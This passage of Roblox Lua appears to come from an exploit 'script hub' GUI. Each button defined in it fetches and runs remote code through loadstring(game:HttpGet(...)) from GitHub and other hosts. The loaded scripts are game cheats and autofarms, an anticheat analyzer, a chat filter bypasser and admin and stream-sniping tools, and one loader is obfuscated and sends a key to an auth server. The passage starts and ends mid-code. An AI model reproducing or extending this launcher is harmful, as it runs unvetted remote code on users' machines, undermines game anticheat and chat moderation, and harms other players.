scne65.BorderColor3 = Color3.new(0, 1, 0)
scne65.BorderSizePixel = 3
scne65.TextColor3 = Color3.new(1, 1, 1)
scne65.TextScaled = true
scne65.Font = Enum.Font.Roboto
scne65.Text = "Tornado Parts Gui"
scne65.Visible = false
scne65.MouseButton1Click:Connect(function()
notif({
		Text = "This script maybe will crash your device.",
		Duration = 5,
		topm = "Warning!"
	})
wait(2)
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/TornadoGuiIg/refs/heads/main/Srrylolitsobfuscatednomorestealing", true))()
end)
end)

scne66 = Instance.new("TextButton")
scne66.Parent = sc
scne66.Name = "scne66"
scne66.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne66.Position = UDim2.new(0.69, 0, 0.43, 0)
scne66.BackgroundColor3 = Color3.new(0, 0, 0)
scne66.BorderColor3 = Color3.new(0, 1, 0)
scne66.BorderSizePixel = 3
scne66.TextColor3 = Color3.new(1, 1, 1)
scne66.TextScaled = true
scne66.Font = Enum.Font.Roboto
scne66.Text = "Invisible Button"
scne66.Visible = false
scne66.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))()
end)

scne67 = Instance.new("TextButton")
scne67.Parent = sc
scne67.Name = "scne67"
scne67.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scne67.Position = UDim2.new(0.86, 0, 0.43, 0)
scne67.BackgroundColor3 = Color3.new(0, 0, 0)
scne67.BorderColor3 = Color3.new(0, 1, 0)
scne67.BorderSizePixel = 3
scne67.TextColor3 = Color3.new(1, 1, 1)
scne67.TextScaled = true
scne67.Font = Enum.Font.Roboto
scne67.Text = "Hug Tool"
scne67.Visible = false
scne67.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Hug%20Tool"))()

--[[ don't mind the notification saying "you have to be r15 dummy" it should be "you have to be r6 dummy" lol I forgot to change it ]]
end)

scne68 = Instance.new("TextButton")
scne68.Parent = sc
scne68.Name = "scne68"
scne68.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne68.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
scne68.BackgroundColor3 = Color3.new(0, 0, 0)
scne68.BorderColor3 = Color3.new(1, 0, 0)
scne68.BorderSizePixel = 3
scne68.TextColor3 = Color3.new(1, 1, 1)
scne68.TextScaled = true
scne68.Font = Enum.Font.Roboto
scne68.Text = "Anticheat Analyzer"
scne68.Visible = false
scne68.MouseButton1Click:Connect(function()
notif({
		Text = "This Might Not Be That Accurate On Some Games",
		Duration = 3,
		topm = "Warning!"
	})
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Analyser/refs/heads/main/AAA", true))()
end)
end)

scne69 = Instance.new("TextButton")
scne69.Parent = sc
scne69.Name = "scne69"
scne69.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne69.Position = UDim2.new(0.18, 0, 0.63, 0)
scne69.BackgroundColor3 = Color3.new(0, 0, 0)
scne69.BorderColor3 = Color3.new(1, 0, 0)
scne69.BorderSizePixel = 3
scne69.TextColor3 = Color3.new(1, 1, 1)
scne69.TextScaled = true
scne69.Font = Enum.Font.Roboto
scne69.Text = "Animatrix Gui"
scne69.Visible = false
scne69.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))()
end)

scne70 = Instance.new("TextButton")
scne70.Parent = sc
scne70.Name = "scne70"
scne70.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne70.Position = UDim2.new(0.35, 0, 0.63, 0)
scne70.BackgroundColor3 = Color3.new(0, 0, 0)
scne70.BorderColor3 = Color3.new(1, 0, 0)
scne70.BorderSizePixel = 3
scne70.TextColor3 = Color3.new(1, 1, 1)
scne70.TextScaled = true
scne70.Font = Enum.Font.Roboto
scne70.Text = "Place Finder"
scne70.Visible = false
scne70.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ACEtheSOLID/NoobyHub-Reborn/refs/heads/main/PlaceFinder-v0.1.lua"))()
end)

scne71 = Instance.new("TextButton")
scne71.Parent = sc
scne71.Name = "scne71"
scne71.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne71.Position = UDim2.new(0.52, 0, 0.63, 0)
scne71.BackgroundColor3 = Color3.new(0, 0, 0)
scne71.BorderColor3 = Color3.new(1, 0, 0)
scne71.BorderSizePixel = 3
scne71.TextColor3 = Color3.new(1, 1, 1)
scne71.TextScaled = true
scne71.Font = Enum.Font.Roboto
scne71.Text = "Chat Translator"
scne71.Visible = false
scne71.MouseButton1Click:Connect(function()
--[[
    Creator: SinoXde
    Working as of: 10/20/2024
    Supports (Tested): Wave

    This Script falls under the MIT License:

    Copyright (c) 2024 SinoXde

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
]]

repeat wait() until game:IsLoaded()

shared.user = 'Sino1507'
shared.repo = 'Chat-Translator/main/src'
shared.entry = 'main.lua'

shared.useBloxstrapRPC = false 
shared.debugMode = false

loadstring(
    game:HttpGetAsync(
        ("https://raw.githubusercontent.com/%s/%s/%s"):format(shared.user, shared.repo, shared.entry)
    )
)()
end)

scne72 = Instance.new("TextButton")
scne72.Parent = sc
scne72.Name = "scne72"
scne72.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scne72.Position = UDim2.new(0.69, 0, 0.63, 0)
scne72.BackgroundColor3 = Color3.new(0, 0, 0)
scne72.BorderColor3 = Color3.new(1, 0, 0)
scne72.BorderSizePixel = 3
scne72.TextColor3 = Color3.new(1, 1, 1)
scne72.TextScaled = true
scne72.Font = Enum.Font.Roboto
scne72.Text = "Anna ChatBypasser"
scne72.Visible = false
scne72.MouseButton1Click:Connect(function()
notif({
		Text = "set ur language to  Қазақ Тілі",
		Duration = 5,
		topm = "Information!"
	})
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua",true))()
end)

scne73 = Instance.new("TextButton")
scne73.Parent = sc
scne73.Name = "scne73"
scne73.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scne73.Position = UDim2.new(0.86, 0, 0.63, 0)
scne73.BackgroundColor3 = Color3.new(0, 0, 0)
scne73.BorderColor3 = Color3.new(100, 100, 0)
scne73.BorderSizePixel = 3
scne73.TextColor3 = Color3.new(1, 1, 1)
scne73.TextScaled = true
scne73.Font = Enum.Font.Roboto
scne73.Text = "AK Admin"
scne73.Visible = false
scne73.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://angelical.me/ak.lua"))()
end)

scne74 = Instance.new("TextButton")
scne74.Parent = sc
scne74.Name = "scne74"
scne74.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
scne74.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
scne74.BackgroundColor3 = Color3.new(0, 0, 0)
scne74.BorderColor3 = Color3.new(1, 0, 0)
scne74.BorderSizePixel = 2
scne74.TextColor3 = Color3.new(1, 1, 1)
scne74.TextScaled = true
scne74.Font = Enum.Font.Roboto
scne74.Text = "Stream Sniper\n[PC]"
scne74.Visible = false
scne74.MouseButton1Click:Connect(function()
notif({
		Text = "This Script is Only For PC",
		Duration = 5,
		topm = "Information!"
	})
notif({
		Text = "Edited by Jkrouzt. Original in Scriptblox",
		Duration = 5,
		topm = "Information!"
	})
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Jkrouz1/refs/heads/main/Stream%20Sniper%20Edited.txt"))()
end)

scne75 = Instance.new("TextButton")
scne75.Parent = sc
scne75.Name = "scne75"
scne75.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
scne75.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
scne75.BackgroundColor3 = Color3.new(0, 0, 0)
scne75.BorderColor3 = Color3.new(1, 0, 0)
scne75.BorderSizePixel = 2
scne75.TextColor3 = Color3.new(1, 1, 1)
scne75.TextScaled = true
scne75.Font = Enum.Font.Roboto
scne75.Text = "Talentless Hub"
scne75.Visible = false
scne75.MouseButton1Click:Connect(function()
notif({
		Text = "works in almost all games that have a piano that uses keyboard input.",
		Duration = 5,
		topm = "Information!"
	})
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/TALENTLESS/main/TALENTLESS",true))()
end)
end)

scne76 = Instance.new("TextButton")
scne76.Parent = sc
scne76.Name = "scne76"
scne76.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scne76.Position = UDim2.new(0.86, 0, 0.229999959, 0)
scne76.BackgroundColor3 = Color3.new(0, 0, 0)
scne76.BorderColor3 = Color3.new(1, 0, 0)
scne76.BorderSizePixel = 3
scne76.TextColor3 = Color3.new(1, 1, 1)
scne76.TextScaled = true
scne76.Font = Enum.Font.Roboto
scne76.Text = "Executor Test Panel"
scne76.Visible = false
scne76.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zryr/executor-test-panel/refs/heads/main/panel.lua"))()
end)

local scsPage = Instance.new("Frame")
scsPage.Parent = sc 
scsPage.Name = "scsPage"
scsPage.Size = UDim2.new(0, 645, 0, 35)
scsPage.Position = UDim2.new(0.00720000034, 0, 0, 0)
scsPage.BackgroundColor3 = Color3.new(0, 0, 0)
scsPage.BorderColor3 = Color3.new(255, 0, 0)
scsPage.BorderSizePixel = 2

local univ = Instance.new("TextLabel")
univ.Parent = scsPage
univ.Name = "titleLabel"
univ.Size = UDim2.new(1, 0, 1.1, 0)
univ.Position = UDim2.new(0, 0, 0, 0)
univ.BackgroundColor3 = Color3.new(0, 0, 0)
univ.BackgroundTransparency = 1
univ.BorderColor3 = Color3.new(0, 0, 0)
univ.BorderSizePixel = 1
univ.TextColor3 = Color3.new(1, 1, 1)
univ.TextScaled = true
univ.Font = Enum.Font.Roboto
univ.Text = "Universal Scripts"
univ.TextXAlignment = Enum.TextXAlignment.Center
univ.TextYAlignment = Enum.TextYAlignment.Center

local npg = Instance.new("TextButton")
npg.Parent = sc
npg.Name = "npg"
npg.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
npg.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
npg.BackgroundColor3 = Color3.new(0, 0, 0)
npg.BorderColor3 = Color3.new(1, 0, 0)
npg.BorderSizePixel = 2
npg.TextColor3 = Color3.new(1, 1, 1)
npg.TextScaled = true
npg.Font = Enum.Font.GothamBold
npg.Text = ">"

local bpg = Instance.new("TextButton")
bpg.Parent = sc
bpg.Name = "bpg"
bpg.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bpg.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bpg.BackgroundColor3 = Color3.new(0, 0, 0)
bpg.BorderColor3 = Color3.new(1, 0, 0)
bpg.BorderSizePixel = 2
bpg.TextColor3 = Color3.new(1, 1, 1)
bpg.TextScaled = true
bpg.Font = Enum.Font.GothamBold
bpg.Text = "<"
bpg.Visible = false

npg2 = Instance.new("TextButton")
npg2.Parent = sc
npg2.Name = "npg2"
npg2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
npg2.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
npg2.BackgroundColor3 = Color3.new(0, 0, 0)
npg2.BorderColor3 = Color3.new(1, 0, 0)
npg2.BorderSizePixel = 2
npg2.TextColor3 = Color3.new(1, 1, 1)
npg2.TextScaled = true
npg2.Font = Enum.Font.GothamBold
npg2.Text = ">"
npg2.Visible = false

bpg2 = Instance.new("TextButton")
bpg2.Parent = sc
bpg2.Name = "bpg2"
bpg2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bpg2.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bpg2.BackgroundColor3 = Color3.new(0, 0, 0)
bpg2.BorderColor3 = Color3.new(1, 0, 0)
bpg2.BorderSizePixel = 2
bpg2.TextColor3 = Color3.new(1, 1, 1)
bpg2.TextScaled = true
bpg2.Font = Enum.Font.GothamBold
bpg2.Text = "<"
bpg2.Visible = false

local ngpg = Instance.new("TextButton")
ngpg.Parent = sc
ngpg.Name = "ngpg "
ngpg.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
ngpg.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
ngpg.BackgroundColor3 = Color3.new(0, 0, 0)
ngpg.BorderColor3 = Color3.new(1, 0, 0)
ngpg.BorderSizePixel = 2
ngpg.TextColor3 = Color3.new(1, 1, 1)
ngpg.TextScaled = true
ngpg.Font = Enum.Font.GothamBold
ngpg.Text = ">"
ngpg.Visible = false

local bgpg = Instance.new("TextButton")
bgpg.Parent = sc
bgpg.Name = "bgpg"
bgpg.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bgpg.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bgpg.BackgroundColor3 = Color3.new(0, 0, 0)
bgpg.BorderColor3 = Color3.new(1, 0, 0)
bgpg.BorderSizePixel = 2
bgpg.TextColor3 = Color3.new(1, 1, 1)
bgpg.TextScaled = true
bgpg.Font = Enum.Font.GothamBold
bgpg.Text = "<"
bgpg.Visible = false

local ngpg2 = Instance.new("TextButton")
ngpg2.Parent = sc
ngpg2.Name = "ngpg2 "
ngpg2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
ngpg2.Position = UDim2.new(0.860000014, 0, 0.920000017, 0)
ngpg2.BackgroundColor3 = Color3.new(0, 0, 0)
ngpg2.BorderColor3 = Color3.new(1, 0, 0)
ngpg2.BorderSizePixel = 2
ngpg2.TextColor3 = Color3.new(1, 1, 1)
ngpg2.TextScaled = true
ngpg2.Font = Enum.Font.GothamBold
ngpg2.Text = ">"
ngpg2.Visible = false

local bgpg2 = Instance.new("TextButton")
bgpg2.Parent = sc
bgpg2.Name = "bgpg2"
bgpg2.Size = UDim2.new(0.130000025, 0, 0.0700000003, 0)
bgpg2.Position = UDim2.new(0.0100000035, 0, 0.920000196, 0)
bgpg2.BackgroundColor3 = Color3.new(0, 0, 0)
bgpg2.BorderColor3 = Color3.new(1, 0, 0)
bgpg2.BorderSizePixel = 2
bgpg2.TextColor3 = Color3.new(1, 1, 1)
bgpg2.TextScaled = true
bgpg2.Font = Enum.Font.GothamBold
bgpg2.Text = "<"
bgpg2.Visible = false

local mpages = Instance.new("TextLabel")
mpages.Parent = sc
mpages.Name = "mpages"
mpages.Size = UDim2.new(0.150000006, 0, 0.0799999982, 0)
mpages.Position = UDim2.new(0.429999977, 0, 0.921000004, 0)
mpages.BackgroundColor3 = Color3.new(0, 0, 0)
mpages.BackgroundTransparency = 0
mpages.BorderColor3 = Color3.new(1, 0, 0)
mpages.BorderSizePixel = 2
mpages.TextColor3 = Color3.new(1, 1, 1)
mpages.TextScaled = true
mpages.Text = "Page 1"
mpages.TextXAlignment = Enum.TextXAlignment.Center
mpages.TextYAlignment = Enum.TextYAlignment.Center

local nextmn = Instance.new("TextButton")
nextmn.Parent = scsPage
nextmn.Text = ">"
nextmn.TextScaled = true
nextmn.TextColor3 = Color3.new(1, 0, 0)
nextmn.Size = UDim2.new(0, 50, 0, 35)
nextmn.Position = UDim2.new(0, 590, 0, 0)
nextmn.BorderColor3 = Color3.new(1, 0, 0)
nextmn.BorderSizePixel = 2
nextmn.BackgroundColor3 = Color3.new(0, 0, 0)
nextmn.BackgroundTransparency = 0.5
nextmn.Visible = true

local nextmn2 = Instance.new("TextButton")
nextmn2.Parent = scsPage
nextmn2.Text = "<"
nextmn2.TextScaled = true
nextmn2.TextColor3 = Color3.new(1, 0, 0)
nextmn2.Size = UDim2.new(0, 50, 0, 35)
nextmn2.Position = UDim2.new(0, 5, 0, 0)
nextmn2.BorderColor3 = Color3.new(1, 0, 0)
nextmn2.BorderSizePixel = 2
nextmn2.BackgroundColor3 = Color3.new(0, 0, 0)
nextmn2.BackgroundTransparency = 0.5
nextmn2.Visible = false

local scg1 = Instance.new("TextButton")
scg1.Parent = sc
scg1.Name = "scg1"
scg1.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg1.Position = UDim2.new(0.00996587239, 0, 0.150, 0)
scg1.BackgroundColor3 = Color3.new(0, 0, 0)
scg1.BorderColor3 = Color3.new(1, 0, 0)
scg1.BorderSizePixel = 3
scg1.TextColor3 = Color3.new(1, 1, 1)
scg1.TextScaled = true
scg1.Font = Enum.Font.Roboto
scg1.Text = "Eclipse hub (mm2)"
scg1.Visible = false
scg1.MouseButton1Click:Connect(function()
    getgenv().mainKey = "nil"

local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)

local scg2 = Instance.new("TextButton")
scg2.Parent = sc
scg2.Name = "scg2"
scg2.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg2.Position = UDim2.new(0.18, 0, 0.150, 0)
scg2.BackgroundColor3 = Color3.new(0, 0, 0)
scg2.BorderColor3 = Color3.new(1, 0, 0)
scg2.BorderSizePixel = 3
scg2.TextColor3 = Color3.new(1, 1, 1)
scg2.TextScaled = true
scg2.Font = Enum.Font.Roboto
scg2.Text = "X hub (mm2)"
scg2.Visible = false
scg2.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
end)

local scg3 = Instance.new("TextButton")
scg3.Parent = sc
scg3.Name = "scg3"
scg3.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg3.Position = UDim2.new(0.35, 0, 0.150, 0)
scg3.BackgroundColor3 = Color3.new(0, 0, 0)
scg3.BorderColor3 = Color3.new(1, 0, 0)
scg3.BorderSizePixel = 3
scg3.TextColor3 = Color3.new(1, 1, 1)
scg3.TextScaled = true
scg3.Font = Enum.Font.Roboto
scg3.Text = "YARHM (mm2) "
scg3.Visible = false
scg3.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
end)

local scg4 = Instance.new("TextButton")
scg4.Parent = sc
scg4.Name = "scg4"
scg4.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg4.Position = UDim2.new(0.52, 0, 0.150, 0)
scg4.BackgroundColor3 = Color3.new(0, 0, 0)
scg4.BorderColor3 = Color3.new(1, 0, 0)
scg4.BorderSizePixel = 3
scg4.TextColor3 = Color3.new(1, 1, 1)
scg4.TextScaled = true
scg4.Font = Enum.Font.Roboto
scg4.Text = "Vynixu's (mm2)"
scg4.Visible = false
scg4.MouseButton1Click:Connect(function()
    loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

local scg5 = Instance.new("TextButton")
scg5.Parent = sc
scg5.Name = "scg5"
scg5.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg5.Position = UDim2.new(0.69, 0, 0.150, 0)
scg5.BackgroundColor3 = Color3.new(0, 0, 0)
scg5.BorderColor3 = Color3.new(1, 0, 0)
scg5.BorderSizePixel = 3
scg5.TextColor3 = Color3.new(1, 1, 1)
scg5.TextScaled = true
scg5.Font = Enum.Font.Roboto
scg5.Text = "EGG HUNT (mm2)"
scg5.Visible = false
scg5.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/mm2", false))()
end)

local scg6 = Instance.new("TextButton")
scg6.Parent = sc
scg6.Name = "scg6"
scg6.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scg6.Position = UDim2.new(0.86, 0, 0.150, 0)
scg6.BackgroundColor3 = Color3.new(0, 0, 0)
scg6.BorderColor3 = Color3.new(1, 1, 0)
scg6.BorderSizePixel = 3
scg6.TextColor3 = Color3.new(1, 1, 1)
scg6.TextScaled = true
scg6.Font = Enum.Font.Roboto
scg6.Text = "Aussie hub (mm2) "
scg6.Visible = false
scg6.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet(request({Url='https://aussie.productions/script'}).Body))()
end)

local scg7 = Instance.new("TextButton")
scg7.Parent = sc
scg7.Name = "scg7"
scg7.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg7.Position = UDim2.new(0.00996587239, 0, 0.350, 0)
scg7.BackgroundColor3 = Color3.new(0, 0, 0)
scg7.BorderColor3 = Color3.new(1, 0, 0)
scg7.BorderSizePixel = 3
scg7.TextColor3 = Color3.new(1, 1, 1)
scg7.TextScaled = true
scg7.Font = Enum.Font.Roboto
scg7.Text = "Speed Hub X (Fisch)"
scg7.Visible = false
scg7.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

local scg8 = Instance.new("TextButton")
scg8.Parent = sc
scg8.Name = "scg8"
scg8.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg8.Position = UDim2.new(0.18, 0, 0.350, 0)
scg8.BackgroundColor3 = Color3.new(0, 0, 0)
scg8.BorderColor3 = Color3.new(1, 0, 0)
scg8.BorderSizePixel = 3
scg8.TextColor3 = Color3.new(1, 1, 1)
scg8.TextScaled = true
scg8.Font = Enum.Font.Roboto
scg8.Text = "Disch (Fisch) "
scg8.Visible = false
scg8.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hakariqScripts/disch2/refs/heads/main/disch%20script"))()
end)

local scg9 = Instance.new("TextButton")
scg9.Parent = sc
scg9.Name = "scg9"
scg9.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg9.Position = UDim2.new(0.35, 0, 0.350, 0)
scg9.BackgroundColor3 = Color3.new(0, 0, 0)
scg9.BorderColor3 = Color3.new(1, 0, 0)
scg9.BorderSizePixel = 3
scg9.TextColor3 = Color3.new(1, 1, 1)
scg9.TextScaled = true
scg9.Font = Enum.Font.Roboto
scg9.Text = "homohack (Fisch)"
scg9.Visible = false
scg9.MouseButton1Click:Connect(function()
local new = Drawing.new; Drawing.new = function(object)
    local old = new(object);

    if (object == "Circle") then
        old.Filled = false;
    end

    return old;
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
end)

local scg10 = Instance.new("TextButton")
scg10.Parent = sc
scg10.Name = "scg10"
scg10.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg10.Position = UDim2.new(0.52, 0, 0.350, 0)
scg10.BackgroundColor3 = Color3.new(0, 0, 0)
scg10.BorderColor3 = Color3.new(1, 1, 0)
scg10.BorderSizePixel = 3
scg10.TextColor3 = Color3.new(1, 1, 1)
scg10.TextScaled = true
scg10.Font = Enum.Font.Roboto
scg10.Text = "Ronix Hub (Fisch) "
scg10.Visible = false
scg10.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a3c501e721ec4d66a864cc2276c0f4e9.lua"))()
end)

local scg11 = Instance.new("TextButton")
scg11.Parent = sc
scg11.Name = "scg11"
scg11.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg11.Position = UDim2.new(0.69, 0, 0.350, 0)
scg11.BackgroundColor3 = Color3.new(0, 0, 0)
scg11.BorderColor3 = Color3.new(1, 1, 0)
scg11.BorderSizePixel = 3
scg11.TextColor3 = Color3.new(1, 1, 1)
scg11.TextScaled = true
scg11.Font = Enum.Font.Roboto
scg11.Text = "Native Hub (Fisch) "
scg11.Visible = false
scg11.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/axized/Native-Hub/refs/heads/main/Native"))()
end)

local scg12 = Instance.new("TextButton")
scg12.Parent = sc
scg12.Name = "scg12"
scg12.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scg12.Position = UDim2.new(0.86, 0, 0.350, 0)
scg12.BackgroundColor3 = Color3.new(0, 0, 0)
scg12.BorderColor3 = Color3.new(1, 0, 0)
scg12.BorderSizePixel = 3
scg12.TextColor3 = Color3.new(1, 1, 1)
scg12.TextScaled = true
scg12.Font = Enum.Font.Roboto
scg12.Text = "Raito Hub (Fisch) "
scg12.Visible = false
scg12.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
end)

local scg13 = Instance.new("TextButton")
scg13.Parent = sc
scg13.Name = "scg13"
scg13.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg13.Position = UDim2.new(0.00996587239, 0, 0.550, 0)
scg13.BackgroundColor3 = Color3.new(0, 0, 0)
scg13.BorderColor3 = Color3.new(1, 0, 0)
scg13.BorderSizePixel = 3
scg13.TextColor3 = Color3.new(1, 1, 1)
scg13.TextScaled = true
scg13.Font = Enum.Font.Roboto
scg13.Text = "BondsFarm (Deadrails) "
scg13.Visible = false
scg13.MouseButton1Click:Connect(function()
getgenv().BondFarmSetting = {
		tweenDuration = 20,
		AutoExecute = true,
		CheckMissedBonds = true
	}

loadstring(game:HttpGet('https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/TheFastestBondStealer.lua'))()
-- Reminder: it only work in 1 player mode
	notif({
		Text = "This Script is Only Work in Singleplayer",
		Duration = 5,
		topm = "Information!"
	})
end)

local scg14 = Instance.new("TextButton")
scg14.Parent = sc
scg14.Name = "scg14"
scg14.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg14.Position = UDim2.new(0.18, 0, 0.550, 0)
scg14.BackgroundColor3 = Color3.new(0, 0, 0)
scg14.BorderColor3 = Color3.new(1, 0, 0)
scg14.BorderSizePixel = 3
scg14.TextColor3 = Color3.new(1, 1, 1)
scg14.TextScaled = true
scg14.Font = Enum.Font.Roboto
scg14.Text = "Strelizia (Deadrails)"
scg14.Visible = false
scg14.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
end)

local scg15 = Instance.new("TextButton")
scg15.Parent = sc
scg15.Name = "scg15"
scg15.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg15.Position = UDim2.new(0.35, 0, 0.550, 0)
scg15.BackgroundColor3 = Color3.new(0, 0, 0)
scg15.BorderColor3 = Color3.new(1, 0, 0)
scg15.BorderSizePixel = 3
scg15.TextColor3 = Color3.new(1, 1, 1)
scg15.TextScaled = true
scg15.Font = Enum.Font.Roboto
scg15.Text = "Nullfire Hub (Deadrails)"
scg15.Visible = false
scg15.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
end)

local scg16 = Instance.new("TextButton")
scg16.Parent = sc
scg16.Name = "scg16"
scg16.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg16.Position = UDim2.new(0.52, 0, 0.550, 0)
scg16.BackgroundColor3 = Color3.new(0, 0, 0)
scg16.BorderColor3 = Color3.new(1, 0, 0)
scg16.BorderSizePixel = 3
scg16.TextColor3 = Color3.new(1, 1, 1)
scg16.TextScaled = true
scg16.Font = Enum.Font.Roboto
scg16.Text = "Darkones Hub (Deadrails)"
scg16.Visible = false
scg16.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/refs/heads/main/Dead%20Rails%20GUI"))()
end)

local scg17 = Instance.new("TextButton")
scg17.Parent = sc
scg17.Name = "scg17"
scg17.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scg17.Position = UDim2.new(0.69, 0, 0.550, 0)
scg17.BackgroundColor3 = Color3.new(0, 0, 0)
scg17.BorderColor3 = Color3.new(1, 0, 0)
scg17.BorderSizePixel = 3
scg17.TextColor3 = Color3.new(1, 1, 1)
scg17.TextScaled = true
scg17.Font = Enum.Font.Roboto
scg17.Text = "Toraisme (Deadrails) "
scg17.Visible = false
scg17.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails"))()
end)

local scg18 = Instance.new("TextButton")
scg18.Parent = sc
scg18.Name = "scg18"
scg18.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scg18.Position = UDim2.new(0.86, 0, 0.550, 0)
scg18.BackgroundColor3 = Color3.new(0, 0, 0)
scg18.BorderColor3 = Color3.new(1, 0, 0)
scg18.BorderSizePixel = 3
scg18.TextColor3 = Color3.new(1, 1, 1)
scg18.TextScaled = true
scg18.Font = Enum.Font.Roboto
scg18.Visible = false
scg18.Text = "Tbao Hub (Deadrails) "
scg18.MouseButton1Click:Connect(function()
